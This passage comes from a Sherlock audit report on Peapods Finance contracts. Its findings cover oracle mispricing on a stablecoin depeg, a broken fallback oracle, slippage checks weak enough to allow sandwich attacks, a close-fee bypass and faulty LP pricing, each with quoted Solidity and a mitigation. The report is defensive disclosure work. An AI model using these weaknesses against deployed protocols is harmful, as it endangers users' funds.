spTKNMinimalOracle uses DIA oracle which only supports /USD pairs, which incorrectly assumes all stablecoins are priced at 1 USD.

### Root Cause

The `_getDefaultPrice18()` function is responsible for returning underlyingTKN/baseTKN. For example, for a PEAS pod (pPEAS) that pairs with WETH, it should return PEAS/WETH.

There are multiple ways to calculate this. The basic idea is to calculate the underlyingTKN price (against any token) using a UniswapV3 pool, and divide it by the baseTKN price (against the same token) using an oracle (Chainlink, DIA, UniV3Pool).

For example, it would be first calculating `_price18` to be PEAS/USDC, then divide it with WETH/USDC. The problem here is, if we are using DIA oracle, since it is always paired with USD, and UniswapV3 pool cannot provide a price against USD, the underlying assumption is all stablecoins (e.g. USDC) is priced to 1 USD.

However, this is not always true. A recent USDC depeg event on 2023/03 is when it went as low as 87 cents (https://decrypt.co/123211/usdc-stablecoin-depegs-90-cents-circle-exposure-silicon-valley-bank).

This would cause the oracle pricing to be inaccurate.

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/oracle/spTKNMinimalOracle.sol#L1

```solidity
    function _getDefaultPrice18() internal view returns (bool _isBadData, uint256 _price18) {
        (_isBadData, _price18) = IMinimalSinglePriceOracle(UNISWAP_V3_SINGLE_PRICE_ORACLE).getPriceUSD18(
            BASE_CONVERSION_CHAINLINK_FEED, underlyingTkn, UNDERLYING_TKN_CL_POOL, twapInterval
        );
        if (_isBadData) {
            return (true, 0);
        }

        if (BASE_CONVERSION_DIA_FEED != address(0)) {
            (bool _subBadData, uint256 _baseConvPrice18) = IMinimalSinglePriceOracle(DIA_SINGLE_PRICE_ORACLE)
                .getPriceUSD18(address(0), BASE_IN_CL, BASE_CONVERSION_DIA_FEED, 0);
            if (_subBadData) {
                return (true, 0);
            }
            _price18 = (10 ** 18 * _price18) / _baseConvPrice18;
        } else if (BASE_CONVERSION_CL_POOL != address(0)) {
            (bool _subBadData, uint256 _baseConvPrice18) = IMinimalSinglePriceOracle(UNISWAP_V3_SINGLE_PRICE_ORACLE)
                .getPriceUSD18(address(0), BASE_IN_CL, BASE_CONVERSION_CL_POOL, twapInterval);
            if (_subBadData) {
                return (true, 0);
            }
            _price18 = (10 ** 18 * _price18) / _baseConvPrice18;
        }
    }
```

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/oracle/DIAOracleV2SinglePriceOracle.sol

```solidity
    function getPriceUSD18(
        address _clBaseConversionPoolPriceFeed,
        address _quoteToken,
        address _quoteDIAOracle,
        uint256
    ) external view virtual override returns (bool _isBadData, uint256 _price18) {
        string memory _symbol = IERC20Metadata(_quoteToken).symbol();
@>      (uint128 _quotePrice8, uint128 _refreshedLast) =
            IDIAOracleV2(_quoteDIAOracle).getValue(string.concat(_symbol, "/USD"));
        if (_refreshedLast + staleAfterLastRefresh < block.timestamp) {
            _isBadData = true;
        }

        // default base price to 1, which just means return only quote pool price without any base conversion
        uint256 _basePrice18 = 10 ** 18;
        uint256 _updatedAt = block.timestamp;
        bool _isBadDataBase;
        if (_clBaseConversionPoolPriceFeed != address(0)) {
            (_basePrice18, _updatedAt, _isBadDataBase) = _getChainlinkPriceFeedPrice18(_clBaseConversionPoolPriceFeed);
            uint256 _maxDelayBase = feedMaxOracleDelay[_clBaseConversionPoolPriceFeed] > 0
                ? feedMaxOracleDelay[_clBaseConversionPoolPriceFeed]
                : defaultMaxOracleDelay;
            uint256 _isBadTimeBase = block.timestamp - _maxDelayBase;
            _isBadData = _isBadData || _isBadDataBase || _updatedAt < _isBadTimeBase;
        }
        _price18 = (_quotePrice8 * _basePrice18) / 10 ** 8;
    }
```

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/oracle/UniswapV3SinglePriceOracle.sol

```solidity
    function getPriceUSD18(
        address _clBaseConversionPoolPriceFeed,
        address _quoteToken,
        address _quoteV3Pool,
        uint256 _twapInterval
    ) external view virtual override returns (bool _isBadData, uint256 _price18) {
        uint256 _quotePriceX96 = _getPoolPriceTokenDenomenator(_quoteToken, _quoteV3Pool, uint32(_twapInterval));
        // default base price to 1, which just means return only quote pool price without any base conversion
        uint256 _basePrice18 = 10 ** 18;
        uint256 _updatedAt = block.timestamp;
        if (_clBaseConversionPoolPriceFeed != address(0)) {
            (_basePrice18, _updatedAt, _isBadData) = _getChainlinkPriceFeedPrice18(_clBaseConversionPoolPriceFeed);
        }
        _price18 = (_quotePriceX96 * _basePrice18) / FixedPoint96.Q96;
        uint256 _maxDelay = feedMaxOracleDelay[_clBaseConversionPoolPriceFeed] > 0
            ? feedMaxOracleDelay[_clBaseConversionPoolPriceFeed]
            : defaultMaxOracleDelay;
        _isBadData = _isBadData || _updatedAt < block.timestamp - _maxDelay;
    }
```

### Internal pre-conditions

- DIA oracle is used, or chainlink oracle uses the /USD pair for calculating the final price result.

### External pre-conditions

- Stablecoin (e.g. USDC) depegs from USD.

### Attack Path

N/A

### Impact

Oracle will return an incorrect price. This will lead to overpricing or underpricing the asset/collateral ratio in Fraxlend. Users can either borrow more assets (if ratio is underestimated), or liquidate positions (if ratio is overestimated).

### PoC

N/A

### Mitigation

Consider the USD and stablecoin (e.g. USDC) difference.


# Issue M-25: spTKNMinimalOracle `_calculateSpTknPerBase()` does not return 0, which breaks the feature of having a fallback oracle. 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/476 

## Found by 
X77, pkqs90


### Summary

spTKNMinimalOracle `_calculateSpTknPerBase()` does not return 0, which breaks the feature of having a fallback oracle.

### Root Cause

The spTKNMinimalOracle is a dual oracle, which fetches price from two different sources. If one of the data source fails, the other one is used as a fallback. This is also the design in original Fraxlend.

However, the `_calculateSpTknPerBase()` function has a check for `require(_basePerSpTkn18 > 0, "V2R");`, this means the price will never be zero.

This defeats the meaning of having a fallback oracle, where one is supposed to work if the other one fails. But the current implementation forces both oracle to return the correct value, which is obviously not the original design.

This will lead to Fraxlend DoS when it shouldn't be.

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/oracle/spTKNMinimalOracle.sol#L1

```solidity
    function getPrices()
        public
        view
        virtual
        override
        returns (bool _isBadData, uint256 _priceLow, uint256 _priceHigh)
    {
        uint256 _priceSpTKNBase = _calculateSpTknPerBase(0);
        _isBadData = _priceSpTKNBase == 0;
        uint8 _baseDec = IERC20Metadata(BASE_TOKEN).decimals();
        uint256 _priceOne18 = _priceSpTKNBase * 10 ** (_baseDec > 18 ? _baseDec - 18 : 18 - _baseDec);

        uint256 _priceTwo18 = _priceOne18;
        if (CHAINLINK_BASE_PRICE_FEED != address(0) && CHAINLINK_QUOTE_PRICE_FEED != address(0)) {
            uint256 _clPrice18 = _chainlinkBasePerPaired18();
            uint256 _clPriceBaseSpTKN = _calculateSpTknPerBase(_clPrice18);
            _priceTwo18 = _clPriceBaseSpTKN * 10 ** (_baseDec > 18 ? _baseDec - 18 : 18 - _baseDec);
            _isBadData = _isBadData || _clPrice18 == 0;
        }

@>      require(_priceOne18 != 0 || _priceTwo18 != 0, "BZ");

@>      if (_priceTwo18 == 0) {
            _priceLow = _priceOne18;
            _priceHigh = _priceOne18;
        } else {
            // If the prices are the same it means the CL price was pulled as the UniV3 price
            (_priceLow, _priceHigh) =
                _priceOne18 > _priceTwo18 ? (_priceTwo18, _priceOne18) : (_priceOne18, _priceTwo18);
        }
    }

    function _calculateSpTknPerBase(uint256 _price18) internal view returns (uint256 _spTknBasePrice18) {
        uint256 _priceBasePerPTkn18 = _calculateBasePerPTkn(_price18);
        address _pair = _getPair();

        (uint112 _reserve0, uint112 _reserve1) = V2_RESERVES.getReserves(_pair);
        uint256 _k = uint256(_reserve0) * _reserve1;
        uint256 _kDec = 10 ** IERC20Metadata(IUniswapV2Pair(_pair).token0()).decimals()
            * 10 ** IERC20Metadata(IUniswapV2Pair(_pair).token1()).decimals();
        uint256 _avgBaseAssetInLp18 = _sqrt((_priceBasePerPTkn18 * _k) / _kDec) * 10 ** (18 / 2);
        uint256 _basePerSpTkn18 =
            (2 * _avgBaseAssetInLp18 * 10 ** IERC20Metadata(_pair).decimals()) / IERC20(_pair).totalSupply();

@>      require(_basePerSpTkn18 > 0, "V2R");

        _spTknBasePrice18 = 10 ** (18 * 2) / _basePerSpTkn18;

        // if the base asset is a pod, we will assume that the CL/chainlink pool(s) are
        // pricing the underlying asset of the base asset pod, and therefore we will
        // adjust the output price by CBR and unwrap fee for this pod for more accuracy and
        // better handling accounting for liquidation path
        if (BASE_IS_POD) {
            _spTknBasePrice18 = _checkAndHandleBaseTokenPodConfig(_spTknBasePrice18);
        } else if (BASE_IS_FRAX_PAIR) {
            _spTknBasePrice18 = IFraxlendPair(BASE_TOKEN).convertToAssets(_spTknBasePrice18);
        }
    }
```

### Internal pre-conditions

N/A

### External pre-conditions

- One of the oracle fails, e.g. due to data out of date.

### Attack Path

N/A

### Impact

Fraxlend is supposed to work when only one oracle fails, but now it doesn't.

### PoC

N/A

### Mitigation

Allow one of the oracles to return 0. Return 0 directly if `_basePerSpTkn18` was 0 in function `_calculateSpTknPerBase()`.

# Issue M-26: spTKNMinimalOracle does not support advanced self-lending pods, where pairedLpTKN is a podded fraxlend token. 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/477 

## Found by 
TessKimy, pkqs90


### Summary

spTKNMinimalOracle does not support advanced self-lending pods, where pairedLpTKN is a podded fraxlend token.

### Root Cause

spTKNMinimalOracle should work for self-lending pods. There are two kinds of self-lending pods. The first is the regular one, where the pairedLpTKN for a pod is a fraxlend paired fTKN. However, there is also an "advanced feature", so the pairedLpTKN is a podded fTKN (which makes it a pfTKN). This can be seen in `LeverageManager.sol` contract when initializing a leverage position.

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/lvf/LeverageManager.sol#L60

```solidity
    /// @notice The ```initializePosition``` function initializes a new position and mints a new position NFT
    /// @param _pod The pod to leverage against for the new position
    /// @param _recipient User to receive the position NFT
    /// @param _overrideLendingPair If it's a self-lending pod, an override lending pair the user will use
@>  /// @param _hasSelfLendingPairPod bool Advanced implementation parameter that determines whether or not the self lending pod's paired LP asset (fTKN) is podded as well
    function initializePosition(
        address _pod,
        address _recipient,
        address _overrideLendingPair,
        bool _hasSelfLendingPairPod
    ) external override returns (uint256 _positionId) {
        _positionId = _initializePosition(_pod, _recipient, _overrideLendingPair, _hasSelfLendingPairPod);
    }
```

Now, going back to the oracle. There are two flags in the oracle: `BASE_IS_POD` and `BASE_IS_FRAX_PAIR`.

1. `BASE_IS_POD` is used to support where pairedLpTKN is a normal pod token, e.g. pOHM.
2. `BASE_IS_FRAX_PAIR` is used to support where pairedLpTKN is a normal fraxlend token, e.g. fUSDC.

However, there is no support for a podded fraxlend token.

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/oracle/spTKNMinimalOracle.sol

```solidity
    function _calculateSpTknPerBase(uint256 _price18) internal view returns (uint256 _spTknBasePrice18) {
        uint256 _priceBasePerPTkn18 = _calculateBasePerPTkn(_price18);
        address _pair = _getPair();

        (uint112 _reserve0, uint112 _reserve1) = V2_RESERVES.getReserves(_pair);
        uint256 _k = uint256(_reserve0) * _reserve1;
        uint256 _kDec = 10 ** IERC20Metadata(IUniswapV2Pair(_pair).token0()).decimals()
            * 10 ** IERC20Metadata(IUniswapV2Pair(_pair).token1()).decimals();
        uint256 _avgBaseAssetInLp18 = _sqrt((_priceBasePerPTkn18 * _k) / _kDec) * 10 ** (18 / 2);
        uint256 _basePerSpTkn18 =
            (2 * _avgBaseAssetInLp18 * 10 ** IERC20Metadata(_pair).decimals()) / IERC20(_pair).totalSupply();
        require(_basePerSpTkn18 > 0, "V2R");
        _spTknBasePrice18 = 10 ** (18 * 2) / _basePerSpTkn18;

        // if the base asset is a pod, we will assume that the CL/chainlink pool(s) are
        // pricing the underlying asset of the base asset pod, and therefore we will
        // adjust the output price by CBR and unwrap fee for this pod for more accuracy and
        // better handling accounting for liquidation path
        if (BASE_IS_POD) {
@>          _spTknBasePrice18 = _checkAndHandleBaseTokenPodConfig(_spTknBasePrice18);
        } else if (BASE_IS_FRAX_PAIR) {
@>          _spTknBasePrice18 = IFraxlendPair(BASE_TOKEN).convertToAssets(_spTknBasePrice18);
        }
    }

    function _checkAndHandleBaseTokenPodConfig(uint256 _currentPrice18) internal view returns (uint256 _finalPrice18) {
        _finalPrice18 = _accountForCBRInPrice(BASE_TOKEN, address(0), _currentPrice18);
        _finalPrice18 = _accountForUnwrapFeeInPrice(BASE_TOKEN, _finalPrice18);
    }
```

### Internal pre-conditions

N/A

### External pre-conditions

N/A

### Attack Path

N/A

### Impact

spTKNMinimalOracle does work for podded fraxlend tokens, which means this advanced feature cannot be used in LVF at all.

### PoC

N/A

### Mitigation

Support the podded fraxlend token feature.


# Issue M-27: AutoCompoundingPodLP does not use correct oracle price as slippage for pairedLpTKn -> pTKN swap. 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/478 

## Found by 
bretzel, pkqs90


### Summary

AutoCompoundingPodLP does not use correct oracle price as slippage for pairedLpTKn -> pTKN swap.

### Root Cause

When doing the pairedLpTKN -> pTKN swap in AutoCompoundingPodLP, it checks the oracle for the expected output, and uses it as slippage. However, the oracle does not return expected result.

There bug here is: the `getPodPerBasePrice()` function returns baseTKN/pTKN price, instead of pairedLpTKN/pTKN price. The difference is for podded token or fraxlend pair token as pairedLpTKN, e.g. pOHM or fUSDC. The price differs by a constant factor of asset/share ratio of the pod or the fraxlend pair token.

This underestimates the oracle price, which loosens the slippage constraint. This may lead to sandwich opportunities for attackers.

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/AutoCompoundingPodLp.sol#L1

```solidity
    function _pairedLpTokenToPodLp(uint256 _amountIn, uint256 _deadline) internal returns (uint256 _amountOut) {
        address _pairedLpToken = pod.PAIRED_LP_TOKEN();
        uint256 _pairedSwapAmt = _getSwapAmt(_pairedLpToken, address(pod), _pairedLpToken, _amountIn);
        uint256 _pairedRemaining = _amountIn - _pairedSwapAmt;
        uint256 _minPtknOut;
        if (address(podOracle) != address(0)) {
            // calculate the min out with 5% slippage
            // @audit-bug: This does not return the correct oracle price.
            _minPtknOut = (
@>              podOracle.getPodPerBasePrice() * _pairedSwapAmt * 10 ** IERC20Metadata(address(pod)).decimals() * 95
            ) / 10 ** IERC20Metadata(_pairedLpToken).decimals() / 10 ** 18 / 100;
        }
        IERC20(_pairedLpToken).safeIncreaseAllowance(address(DEX_ADAPTER), _pairedSwapAmt);
        try DEX_ADAPTER.swapV2Single(_pairedLpToken, address(pod), _pairedSwapAmt, _minPtknOut, address(this)) returns (
            uint256 _podAmountOut
        ) {
            ...
        }
    }
```

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/oracle/spTKNMinimalOracle.sol

```solidity
    function getPodPerBasePrice() external view override returns (uint256 _pricePTknPerBase18) {
        _pricePTknPerBase18 = 10 ** (18 * 2) / _calculateBasePerPTkn(0);
    }

    function _calculateBasePerPTkn(uint256 _price18) internal view returns (uint256 _basePerPTkn18) {
        // pull from UniV3 TWAP if passed as 0
        if (_price18 == 0) {
            bool _isBadData;
            (_isBadData, _price18) = _getDefaultPrice18();
            if (_isBadData) {
                return 0;
            }
        }
        _basePerPTkn18 = _accountForCBRInPrice(pod, underlyingTkn, _price18);

        // adjust current price for spTKN pod unwrap fee, which will end up making the end price
        // (spTKN per base) higher, meaning it will take more spTKN to equal the value
        // of base token. This will more accurately ensure healthy LTVs when lending since
        // a liquidation path will need to account for unwrap fees
        _basePerPTkn18 = _accountForUnwrapFeeInPrice(pod, _basePerPTkn18);
    }
```


### Internal pre-conditions

N/A

### External pre-conditions

N/A

### Attack Path

N/A

### Impact

Oracle for pairedLpTKN -> pTKN swap slippage is incorrect. The slippage result is underestimated. This may lead to sandwich opportunities for attackers.

### PoC

N/A

### Mitigation

Also multiply the asset/share ratio for podded/fraxlend pair tokens as pairedLpTKN.


# Issue M-28: LeverageManager closeFee is only collected for pTKN, which can be easily bypassed. 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/485 

## Found by 
ZoA, ck, pashap9990, pkqs90


### Summary

LeverageManager closeFee is only collected for pTKN, which can be easily bypassed.

### Root Cause

First we need to understand the workflow of removeLeverage in LeverageManager.

1. Borrow `_borrowAssetAmt` underlying token from flashloan source.
2. Repay these tokens to FraxlendPair.
3. Withdraw collateral (aspTKN) to borrowedTKN and pTKN. If borrowedTKN is not enough to repay the flashloan, swap pTKN to borrowedTKN.
4. Repay flashloan.
5. Send leftover borrowedTKN and pTKN back to position owner.

In step 5, a closeFee is charged. However, this is charged only for pTKN. Users can easily bypass this if he swaps most or all of pTKN to borrowedTKN in step 3. This can be set by setting a large `_podSwapAmtOutMin` for the pTKN -> borrowedTKN swap.

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/lvf/LeverageManager.sol#L1

```solidity
    function callback(bytes memory _userData) external override workflow(false) {
        IFlashLoanSource.FlashData memory _d = abi.decode(_userData, (IFlashLoanSource.FlashData));
        (LeverageFlashProps memory _posProps,) = abi.decode(_d.data, (LeverageFlashProps, bytes));

        address _pod = positionProps[_posProps.positionId].pod;

        require(_getFlashSource(_posProps.positionId) == _msgSender(), "A2");

        if (_posProps.method == FlashCallbackMethod.ADD) {
            uint256 _ptknRefundAmt = _addLeveragePostCallback(_userData);
            if (_ptknRefundAmt > 0) {
                IERC20(_pod).safeTransfer(_posProps.owner, _ptknRefundAmt);
            }
        } else if (_posProps.method == FlashCallbackMethod.REMOVE) {
            (uint256 _ptknToUserAmt, uint256 _pairedLpToUser) = _removeLeveragePostCallback(_userData);
            if (_ptknToUserAmt > 0) {
                // if there's a close fee send returned pod tokens for fee to protocol
@>              if (closeFeePerc > 0) {
                    uint256 _closeFeeAmt = (_ptknToUserAmt * closeFeePerc) / 1000;
                    IERC20(_pod).safeTransfer(feeReceiver, _closeFeeAmt);
                    _ptknToUserAmt -= _closeFeeAmt;
                }
                IERC20(_pod).safeTransfer(_posProps.owner, _ptknToUserAmt);
            }
            // @audit-bug: closeFee is not charged for borrowedTKN.
            if (_pairedLpToUser > 0) {
@>              IERC20(_getBorrowTknForPod(_posProps.positionId)).safeTransfer(_posProps.owner, _pairedLpToUser);
            }
        } else {
            require(false, "NI");
        }
    }

    function _swapPodForBorrowToken(
        address _pod,
        address _targetToken,
        uint256 _podAmt,
        uint256 _targetNeededAmt,
        uint256 _podSwapAmtOutMin
    ) internal returns (uint256 _podRemainingAmt) {
        IDexAdapter _dexAdapter = IDecentralizedIndex(_pod).DEX_HANDLER();
        uint256 _balBefore = IERC20(_pod).balanceOf(address(this));
        IERC20(_pod).safeIncreaseAllowance(address(_dexAdapter), _podAmt);
@>      _dexAdapter.swapV2SingleExactOut(
            _pod, _targetToken, _podAmt, _podSwapAmtOutMin == 0 ? _targetNeededAmt : _podSwapAmtOutMin, address(this)
        );
        _podRemainingAmt = _podAmt - (_balBefore - IERC20(_pod).balanceOf(address(this)));
    }

```

### Internal pre-conditions

N/A

### External pre-conditions

N/A

### Attack Path

User can set a large `_podSwapAmtOutMin` so most of the pTKN is swapped to borrowTKN, to bypass closeFee.

### Impact

User can bypass closeFee when removing leverage.

### PoC

N/A

### Mitigation

Also charge closeFee for leftover borrowedTKN.


# Issue M-29: LeverageManager removeLeverage does not support advanced self-lending pods with podded fTKN as pairedLpTKN. 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/487 

## Found by 
Honour, pkqs90


### Summary

LeverageManager removeLeverage does not support advanced self-lending pods with podded fTKN as pairedLpTKN.

### Root Cause

There are two kinds of self-lending pods. The first is the regular one, where the pairedLpTKN for a pod is a fraxlend paired fTKN. However, there is also an "advanced feature", so the pairedLpTKN is a podded fTKN (which makes it a pfTKN). This can be seen in `LeverageManager.sol` contract when initializing a leverage position where `_hasSelfLendingPairPod` is set to true.

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/lvf/LeverageManager.sol#L60

```solidity
    /// @notice The ```initializePosition``` function initializes a new position and mints a new position NFT
    /// @param _pod The pod to leverage against for the new position
    /// @param _recipient User to receive the position NFT
    /// @param _overrideLendingPair If it's a self-lending pod, an override lending pair the user will use
@>  /// @param _hasSelfLendingPairPod bool Advanced implementation parameter that determines whether or not the self lending pod's paired LP asset (fTKN) is podded as well
    function initializePosition(
        address _pod,
        address _recipient,
        address _overrideLendingPair,
        bool _hasSelfLendingPairPod
    ) external override returns (uint256 _positionId) {
        _positionId = _initializePosition(_pod, _recipient, _overrideLendingPair, _hasSelfLendingPairPod);
    }
```

Now, back to removeLeverage feature. If borrowedTKN is not enough to repay the flashloan, we need to swap pTKN to acquire borrowedTKN. we can see in `_acquireBorrowTokenForRepayment()` function, if `_isPodSelfLending(_props.positionId)` is true, it conducts a pTKN -> pairedLpTKN swap, but it assumes pairedLpTKN is always a fTKN, and does not handle where the pairedLpTKN is a podded fTKN.

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/lvf/LeverageManager.sol

```solidity
    function _acquireBorrowTokenForRepayment(
        LeverageFlashProps memory _props,
        address _pod,
        address _borrowToken,
        uint256 _borrowNeeded,
        uint256 _podAmtReceived,
        uint256 _podSwapAmtOutMin,
        uint256 _userProvidedDebtAmtMax
    ) internal returns (uint256 _podAmtRemaining) {
        _podAmtRemaining = _podAmtReceived;
        uint256 _borrowAmtNeededToSwap = _borrowNeeded;
        if (_userProvidedDebtAmtMax > 0) {
            uint256 _borrowAmtFromUser =
                _userProvidedDebtAmtMax >= _borrowNeeded ? _borrowNeeded : _userProvidedDebtAmtMax;
            _borrowAmtNeededToSwap -= _borrowAmtFromUser;
            IERC20(_borrowToken).safeTransferFrom(_props.sender, address(this), _borrowAmtFromUser);
        }
        // sell pod token into LP for enough borrow token to get enough to repay
        // if self-lending swap for lending pair then redeem for borrow token
        if (_borrowAmtNeededToSwap > 0) {
            if (_isPodSelfLending(_props.positionId)) {
                _podAmtRemaining = _swapPodForBorrowToken(
                    _pod,
                    positionProps[_props.positionId].lendingPair,
                    _podAmtReceived,
                    // @audit-bug: If lendingPair is a podded fTKN, it does not support convertToShares at all.
@>                  IFraxlendPair(positionProps[_props.positionId].lendingPair).convertToShares(_borrowAmtNeededToSwap),
                    _podSwapAmtOutMin
                );
                // @audit-bug: This does not support the "advanced" feature where `_hasSelfLendingPairPod` is true.
@>              IFraxlendPair(positionProps[_props.positionId].lendingPair).redeem(
                    IERC20(positionProps[_props.positionId].lendingPair).balanceOf(address(this)),
                    address(this),
                    address(this)
                );
            } else {
                _podAmtRemaining = _swapPodForBorrowToken(
                    _pod, _borrowToken, _podAmtReceived, _borrowAmtNeededToSwap, _podSwapAmtOutMin
                );
            }
        }
    }
```

### Internal pre-conditions

- `_hasSelfLendingPairPod` is set to true, and a podded fTKN is used for a self lending pod.

### External pre-conditions

N/A

### Attack Path

N/A

### Impact

removeLeverage will fail to for the podded fTKN self-lending pod.

### PoC

N/A

### Mitigation

Support the feature.

# Issue M-30: Zapper `_swapV3Single()` has multiple integration issues with V3 swap. 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/494 

## Found by 
Honour, onthehunt, pkqs90


### Summary

Zapper `_swapV3Single()` has multiple integration issues with V3 swap.

### Root Cause

`IndexUtils#addLPAndStake()` uses the zap feature in case the provided `_pairedLpTokenProvided` token is not equal to `_pairedLpToken`. A swap needs to be conducted first to get the correct pairedLpTKN.

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/IndexUtils.sol#L1

```solidity
    function addLPAndStake(
        IDecentralizedIndex _indexFund,
        uint256 _amountIdxTokens,
        address _pairedLpTokenProvided,
        uint256 _amtPairedLpTokenProvided,
        uint256 _amountPairedLpTokenMin,
        uint256 _slippage,
        uint256 _deadline
    ) external payable override returns (uint256 _amountOut) {
    	...
        if (_pairedLpTokenProvided != _pairedLpToken) {
@>          _zap(_pairedLpTokenProvided, _pairedLpToken, _amtPairedLpTokenProvided, _amountPairedLpTokenMin);
        }
        ...
    }
```

In Zapper contract, there are multiple swap routes, depending on how `zapMap[in][out]` is defined. One of them is using Uniswap V3. However, there are a couple of issues here:

1. In a single hop swap, the pool fee is forced to be `10000` when quering the TWAP oracle. This is the case for PEAS/pairedLpTKN (protocol team commits to maintaining a PEAS/pairedLpTKN CL pool), however this may not be the case for other tokens. We should simply use `_fee` instead of `10000` here.
2. On Arbitrum, the `_getPoolFee()` always return 0, which does not work for DEX_ADAPTER. If we are using UniswapV3 on Arbitrum (instead of Camelot), this logic should be removed.
3. The predefined `V3_ROUTER` is force set to Uniswap router on ethereum mainnet. For multihop v3 swaps, `V3_ROUTER` is used, so it will always fail for other chains, or other DEX routers.

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/Zapper.sol

```solidity
	address constant V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;

    function _getPoolFee(address _pool) internal view returns (uint24) {
@>      return block.chainid == 42161 ? 0 : IUniswapV3Pool(_pool).fee();
    }

    function _swapV3Single(address _in, uint24 _fee, address _out, uint256 _amountIn, uint256 _amountOutMin)
        internal
        returns (uint256)
    {
        address _v3Pool;
@>      try DEX_ADAPTER.getV3Pool(_in, _out, uint24(10000)) returns (address __v3Pool) {
            _v3Pool = __v3Pool;
        } catch {
@>          _v3Pool = DEX_ADAPTER.getV3Pool(_in, _out, int24(200));
        }
        if (_amountOutMin == 0) {
            address _token0 = _in < _out ? _in : _out;
            uint256 _poolPriceX96 =
                V3_TWAP_UTILS.priceX96FromSqrtPriceX96(V3_TWAP_UTILS.sqrtPriceX96FromPoolAndInterval(_v3Pool));
            _amountOutMin = _in == _token0
                ? (_poolPriceX96 * _amountIn) / FixedPoint96.Q96
                : (_amountIn * FixedPoint96.Q96) / _poolPriceX96;
        }

        uint256 _outBefore = IERC20(_out).balanceOf(address(this));
        uint256 _finalSlip = _slippage[_v3Pool] > 0 ? _slippage[_v3Pool] : _defaultSlippage;
        IERC20(_in).safeIncreaseAllowance(address(DEX_ADAPTER), _amountIn);
        DEX_ADAPTER.swapV3Single(
@>          _in, _out, _fee, _amountIn, (_amountOutMin * (1000 - _finalSlip)) / 1000, address(this)
        );
        return IERC20(_out).balanceOf(address(this)) - _outBefore;
    }

    function _swapV3Multi(
        address _in,
        uint24 _fee1,
        address _in2,
        uint24 _fee2,
        address _out,
        uint256 _amountIn,
        uint256 _amountOutMin
    ) internal returns (uint256) {
        uint256 _outBefore = IERC20(_out).balanceOf(address(this));
        IERC20(_in).safeIncreaseAllowance(V3_ROUTER, _amountIn);
        bytes memory _path = abi.encodePacked(_in, _fee1, _in2, _fee2, _out);
@>      ISwapRouter(V3_ROUTER).exactInput(
            ISwapRouter.ExactInputParams({
                path: _path,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: _amountIn,
                amountOutMinimum: _amountOutMin
            })
        );
        return IERC20(_out).balanceOf(address(this)) - _outBefore;
    }
```

### Internal pre-conditions

N/A

### External pre-conditions

N/A

### Attack Path

N/A

### Impact

Zap feature does not work as expected, which impacts users calling `IndexUtils#addLPAndStake()`.

### PoC

N/A

### Mitigation

N/A


# Issue M-31: VotingPool.sol Uniswap V2 pricing formula for spTKN is incorrect 

Source: https://github.com/sherlock-audit/2025-01-peapods-finance-judging/issues/498 

## Found by 
pkqs90


### Summary

VotingPool.sol Uniswap V2 pricing formula for spTKN is incorrect, leading to minting a wrong amount of shares.

### Root Cause

VotingPool is used for user staking their pTKN, spTKN tokens. User are granted the amount of shares equal to the price of the staked tokens. For spTKN, since it is a Uniswap V2 LP of the pTKN and pairedLpTKN, it is priced using the fair pricing formula: https://blog.alphaventuredao.io/fair-lp-token-pricing/.

The formula is `2 * sqrt(k * p0 * p1) / totalSupply`. Here, we assume the pricing use Q96 for handling float numbers, so price p0 and p1 are both under Q96 denomination. Since it is assumed pairedLpTKN is a stablecoin, we can assume p1 = Q96.

Bug 1: `_sqrtPriceX96` the price of PEAS/stablecoin pool. However, `_pricePeasNumX96` should be PEAS/stablecoin price, and it is currently incorrectly reversed to stablecoin/PEAS. This is because Uniswap pool price is token0/token1, and the check `uint256 _pricePeasNumX96 = _token1 == PEAS ? _priceX96 : FixedPoint96.Q96 ** 2 / _priceX96;` here should be `_token0 == PEAS` instead.

Bug 2: If the stablecoin does not have 18 decimals, it should be normalized to 18 decimals first (e.g. USDC). 

Bug 3: The `_pricePPeasNumX96 * _k` multiplication may overflow. Assume both reserve amount has 18 decimals. If both reseve has (1e6)e18 tokens, and price is 2, this would be `Q96 * 1e24 * 1e24 * 2`, which is over uint256. Having a PEAS/stablecoin Uniswap pool with 1e6 USDC and PEAS is not very hard (considering PEAS is ~5 USD).

https://github.com/sherlock-audit/2025-01-peapods-finance/blob/main/contracts/contracts/voting/ConversionFactorSPTKN.sol#L29

```solidity
    function getConversionFactor(address _spTKN)
        external
        view
        override
        returns (uint256 _factor, uint256 _denomenator)
    {
        (uint256 _pFactor, uint256 _pDenomenator) = _calculateCbrWithDen(IStakingPoolToken(_spTKN).INDEX_FUND());
        address _lpTkn = IStakingPoolToken(_spTKN).stakingToken();
        address _token1 = IUniswapV3Pool(PEAS_STABLE_CL_POOL).token1();
        uint160 _sqrtPriceX96 = TWAP_UTILS.sqrtPriceX96FromPoolAndInterval(PEAS_STABLE_CL_POOL);
        uint256 _priceX96 = TWAP_UTILS.priceX96FromSqrtPriceX96(_sqrtPriceX96);
        uint256 _pricePeasNumX96 = _token1 == PEAS ? _priceX96 : FixedPoint96.Q96 ** 2 / _priceX96;
        uint256 _pricePPeasNumX96 = (_pricePeasNumX96 * _pFactor) / _pDenomenator;
